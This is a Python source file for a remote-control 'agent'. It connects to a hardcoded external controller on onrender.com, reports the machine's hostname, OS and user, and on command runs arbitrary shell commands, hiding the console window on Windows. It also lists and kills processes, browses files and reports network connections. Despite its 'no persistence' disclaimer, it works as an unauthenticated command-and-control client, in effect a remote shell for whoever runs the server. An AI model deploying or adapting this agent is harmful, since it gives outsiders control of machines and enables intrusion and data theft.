#!/usr/bin/env python3
"""
Pure Agent - Simple Remote Control Agent
No UAC bypasses, no persistence, no privilege escalation
Pure Socket.IO communication with controller
"""

import socketio
import sys
import os
import platform
import subprocess
import threading
import time
import uuid
import psutil
import json
from datetime import datetime

# Configuration
SERVER_URL = "https://agent-controller-backend.onrender.com"
AGENT_ID = str(uuid.uuid4())

# Socket.IO client
sio = socketio.Client(
    reconnection=True,
    reconnection_attempts=0,
    reconnection_delay=5,
    reconnection_delay_max=30
)

# Agent information
AGENT_INFO = {
    'id': AGENT_ID,
    'hostname': platform.node(),
    'os': platform.system(),
    'os_version': platform.version(),
    'architecture': platform.machine(),
    'username': os.getenv('USERNAME') or os.getenv('USER'),
    'ip': 'Unknown',
    'python_version': platform.python_version()
}

def log(message):
    """Simple logging"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] {message}")

def get_system_info():
    """Get system information"""
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        return {
            **AGENT_INFO,
            'cpu_usage': cpu_percent,
            'memory_total': memory.total,
            'memory_used': memory.used,
            'memory_percent': memory.percent,
            'disk_total': disk.total,
            'disk_used': disk.used,
            'disk_percent': disk.percent,
            'uptime': time.time() - psutil.boot_time()
        }
    except Exception as e:
        log(f"Error getting system info: {e}")
        return AGENT_INFO

def execute_command(command):
    """Execute shell command and return output"""
    try:
        log(f"Executing command: {command}")
        
        # Determine shell based on OS
        if platform.system() == 'Windows':
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )
        else:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
        
        output = result.stdout if result.stdout else result.stderr
        log(f"Command output: {len(output)} characters")
        return output if output else "Command executed successfully (no output)"
        
    except subprocess.TimeoutExpired:
        return "Error: Command timed out after 30 seconds"
    except Exception as e:
        return f"Error executing command: {str(e)}"

def get_process_list():
    """Get list of running processes"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
            try:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'username': proc.info['username'],
                    'cpu_percent': proc.info['cpu_percent'],
                    'memory_percent': proc.info['memory_percent']
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return processes
    except Exception as e:
        log(f"Error getting process list: {e}")
        return []

def kill_process(pid):
    """Kill a process by PID"""
    try:
        process = psutil.Process(int(pid))
        process.terminate()
        process.wait(timeout=5)
        return f"Process {pid} terminated successfully"
    except psutil.NoSuchProcess:
        return f"Process {pid} not found"
    except psutil.AccessDenied:
        return f"Access denied to terminate process {pid}"
    except Exception as e:
        return f"Error terminating process {pid}: {str(e)}"

def get_network_info():
    """Get network information"""
    try:
        connections = []
        for conn in psutil.net_connections(kind='inet'):
            connections.append({
                'local_address': f"{conn.laddr.ip}:{conn.laddr.port}",
                'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                'status': conn.status,
                'pid': conn.pid
            })
        
        return {
            'connections': connections[:50],  # Limit to 50
            'io_counters': dict(psutil.net_io_counters()._asdict())
        }
    except Exception as e:
        log(f"Error getting network info: {e}")
        return {'error': str(e)}

def get_file_listing(path=None):
    """Get file listing for a directory"""
    try:
        if not path:
            path = os.path.expanduser('~')
        
        if not os.path.exists(path):
            return {'error': 'Path does not exist'}
        
        if not os.path.isdir(path):
            return {'error': 'Path is not a directory'}
        
        items = []
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            try:
                stat = os.stat(item_path)
                items.append({
                    'name': item,
                    'path': item_path,
                    'is_dir': os.path.isdir(item_path),
                    'size': stat.st_size,
                    'modified': stat.st_mtime
                })
            except (PermissionError, OSError):
                pass
        
        return {
            'path': path,
            'items': items
        }
    except Exception as e:
        log(f"Error getting file listing: {e}")
        return {'error': str(e)}

# Socket.IO Event Handlers
@sio.event
def connect():
    """Handle connection to controller"""
    log(f"✅ Connected to controller at {SERVER_URL}")
    log(f"Agent ID: {AGENT_ID}")
    
    # Register agent
    sio.emit('agent_register', get_system_info())

@sio.event
def connect_error(data):
    """Handle connection error"""
    log(f"❌ Connection error: {data}")

@sio.event
def disconnect():
    """Handle disconnection"""
    log("⚠️ Disconnected from controller")

@sio.on('execute_command')
def on_execute_command(data):
    """Handle command execution request"""
    try:
        command = data.get('command', '')
        agent_id = data.get('agent_id', '')
        
        if agent_id != AGENT_ID:
            return  # Not for us
        
        log(f"Received command: {command}")
        
        # Execute command
        output = execute_command(command)
        
        # Send result back
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'command': command,
            'output': output,
            'timestamp': time.time()
        })
        
    except Exception as e:
        log(f"Error handling command: {e}")
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': f"Error: {str(e)}",
            'timestamp': time.time()
        })

@sio.on('get_system_info')
def on_get_system_info(data):
    """Handle system info request"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id != AGENT_ID:
            return
        
        info = get_system_info()
        sio.emit('system_info', {
            'agent_id': AGENT_ID,
            'info': info
        })
    except Exception as e:
        log(f"Error getting system info: {e}")

@sio.on('get_processes')
def on_get_processes(data):
    """Handle process list request"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id != AGENT_ID:
            return
        
        processes = get_process_list()
        sio.emit('process_list', {
            'agent_id': AGENT_ID,
            'processes': processes
        })
    except Exception as e:
        log(f"Error getting process list: {e}")

@sio.on('kill_process')
def on_kill_process(data):
    """Handle process kill request"""
    try:
        agent_id = data.get('agent_id', '')
        pid = data.get('pid', '')
        
        if agent_id != AGENT_ID:
            return
        
        result = kill_process(pid)
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': result,
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error killing process: {e}")

@sio.on('get_network_info')
def on_get_network_info(data):
    """Handle network info request"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id != AGENT_ID:
            return
        
        info = get_network_info()
        sio.emit('network_info', {
            'agent_id': AGENT_ID,
            'info': info
        })
    except Exception as e:
        log(f"Error getting network info: {e}")

@sio.on('get_file_listing')
def on_get_file_listing(data):
    """Handle file listing request"""
    try:
        agent_id = data.get('agent_id', '')
        path = data.get('path', None)
        
        if agent_id != AGENT_ID:
            return
        
        listing = get_file_listing(path)
        sio.emit('file_listing', {
            'agent_id': AGENT_ID,
            'listing': listing
        })
    except Exception as e:
        log(f"Error getting file listing: {e}")

@sio.on('shutdown')
def on_shutdown(data):
    """Handle shutdown request"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id != AGENT_ID:
            return
        
        log("Shutdown requested by controller")
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'Agent shutting down...',
            'timestamp': time.time()
        })
        
        # Disconnect and exit
        sio.disconnect()
        sys.exit(0)
        
    except Exception as e:
        log(f"Error during shutdown: {e}")

def heartbeat():
    """Send periodic heartbeat to controller"""
    while True:
        try:
            if sio.connected:
                sio.emit('heartbeat', {
                    'agent_id': AGENT_ID,
                    'timestamp': time.time()
                })
            time.sleep(30)  # Heartbeat every 30 seconds
        except Exception as e:
            log(f"Heartbeat error: {e}")
            time.sleep(30)

def main():
    """Main entry point"""
    log("=" * 70)
    log("Pure Agent - Simple Remote Control")
    log("=" * 70)
    log(f"Agent ID: {AGENT_ID}")
    log(f"Hostname: {AGENT_INFO['hostname']}")
    log(f"OS: {AGENT_INFO['os']} {AGENT_INFO['os_version']}")
    log(f"User: {AGENT_INFO['username']}")
    log(f"Server: {SERVER_URL}")
    log("=" * 70)
    log("")
    log("Features:")
    log("  ✓ Command execution")
    log("  ✓ Process management")
    log("  ✓ File browsing")
    log("  ✓ Network monitoring")
    log("  ✓ System information")
    log("")
    log("No privilege escalation, no UAC bypasses, no persistence")
    log("Pure Socket.IO communication only")
    log("")
    log("=" * 70)
    
    # Start heartbeat thread
    heartbeat_thread = threading.Thread(target=heartbeat, daemon=True)
    heartbeat_thread.start()
    
    # Connect to controller
    while True:
        try:
            log(f"Connecting to controller at {SERVER_URL}...")
            sio.connect(SERVER_URL, transports=['websocket', 'polling'])
            
            # Keep connection alive
            sio.wait()
            
        except KeyboardInterrupt:
            log("Shutting down...")
            break
        except Exception as e:
            log(f"Connection error: {e}")
            log("Retrying in 10 seconds...")
            time.sleep(10)
    
    # Cleanup
    if sio.connected:
        sio.disconnect()
    
    log("Agent stopped")

if __name__ == '__main__':
    main()
